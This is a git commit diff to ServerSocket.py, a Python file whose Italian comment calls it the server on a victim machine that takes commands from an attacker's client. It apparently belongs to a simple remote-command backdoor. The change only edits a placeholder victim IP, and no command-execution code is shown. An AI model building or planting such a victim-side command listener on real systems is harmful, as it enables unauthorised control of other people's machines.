09963ae0647303cc94f244d67858f5b92ac688c0
Gomez16 <kizaru774@gmail.com>
2017-08-01 01:52:10 +0200

    Update ServerSocket.py

--- ServerSocket.py
+++ ServerSocket.py
@@ -11,7 +11,7 @@ import shlex
 
 ###### SERVER (VITTIMA) CHE RICEVE I COMANDI DAL CLIENT (ATTACCANTE) ######
 
-HOST = '192.168.1.xxx'  # IP della vittima
+HOST = '192.168.xxx.xxx'  # IP della vittima
 PORT = 8888  # Porta da usare
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
